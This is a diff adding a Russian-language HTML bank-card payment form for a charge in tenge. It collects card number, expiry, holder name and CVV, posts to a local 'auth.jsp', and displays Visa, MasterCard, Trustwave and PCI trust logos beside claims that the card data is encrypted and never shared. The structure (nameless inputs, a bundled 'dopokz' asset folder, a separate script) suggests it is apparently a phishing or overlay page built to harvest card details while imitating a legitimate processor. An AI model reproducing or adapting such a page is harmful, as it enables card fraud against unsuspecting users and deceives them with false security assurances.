@@ -1,0 +1,70 @@
+<!DOCTYPE HTML SYSTEM "about:legacy-compat">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="stylesheet" href="./images/dopokz/style.css" />
+    <script type='text/javascript' src='./images/dopokz/jquery-1.11.0.min.js'></script>
+    <script type='text/javascript' src='./images/dopokz/dopo.js'></script>
+  </head>
+  <body class="body-processing">
+    <div class="card-block">
+      <form name='frmCardInfo' method='post' action='auth.jsp' id='mainForm'>
+        <div class="row cards">
+          <div class="line block-front">
+            <div class="sub-title">Лицевая сторона</div>
+            <div class="front">
+              <img src="./images/dopokz/card_front.png" alt="" />
+              <div class="number-block">
+                <input type="text" autocomplete="off" class="number-card" maxlength="4" id="number_1" />
+                <input type="text" autocomplete="off" class="number-card" maxlength="4" id="number_2" />
+                <input type="text" autocomplete="off" class="number-card" maxlength="4" id="number_3" />
+                <input type="text" autocomplete="off" class="number-card last" maxlength="4" id="number_4" />
+              </div>
+              <div class="valid-block">
+                <select autocomplete="off" class="valid" id="exp_month" name="exp_month">
+                  <option>01</option><option>02</option><option>03</option><option>04</option><option>05</option><option>06</option>
+                  <option>07</option><option>08</option><option>09</option><option>10</option><option>11</option><option>12</option>
+                </select>
+                <select autocomplete="off" class="valid" id="exp_year" name="exp_year">
+                  <option>2016</option><option>2017</option><option>2018</option><option>2019</option><option>2020</option><option>2021</option><option>2022</option>
+                </select>
+              </div>
+              <div class="name-block">
+                <input autocomplete="off" type="text" class="name-card" id="card_name" />
+                <div class="error_hint">Имя держателя латинскими буквами.</div>
+              </div>
+            </div>
+          </div>
+          <div class="line block-back">
+            <div class="sub-title">Задняя сторона</div>
+            <div class="backside">
+              <img src="./images/dopokz/card_backside.png" alt="" />
+              <div class="cvv-block">
+                <input autocomplete="off" type="password" class="cvv" id="sec_cvv2" maxlength="3" />
+                <div class="error_hint">Номер указан неверно</div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="row btns">
+          <div class="sum">18 520 тенге</div>
+          <a href="javascript:;" onclick="" class="btn">Оплатить</a>
+        </div>
+        <div class="row border">
+          <div class="line processing">
+            <img src="./images/dopokz/processing.png" />
+          </div>
+          <div class="line meta">Реквизиты Вашей карты используются только во время операции и передаются в Visa/MasterCard по защищенному каналу. Данные Вашей карты хранятся в зашифрованном виде и не могут быть переданы третьему лицу.</div>
+        </div>
+      </form>
+      <div class="logos">
+        <img src="./images/dopokz/logo-visa.png" alt="Verified by visa" title="Verified by visa" />
+        <img src="./images/dopokz/logo-trustwave.png" alt="TrustWave Security with Trust" title="TrustWave Security with Trust" />
+        <img src="./images/dopokz/logo-mastercard.png" alt="MasterCard SecureCode" title="MasterCard SecureCode" />
+        <img src="./images/dopokz/logo-pci.png" alt="PCI Security Standards Council" title="PCI Security Standards Council" />
+      </div>
+    </div>
+  </body>
+</html>
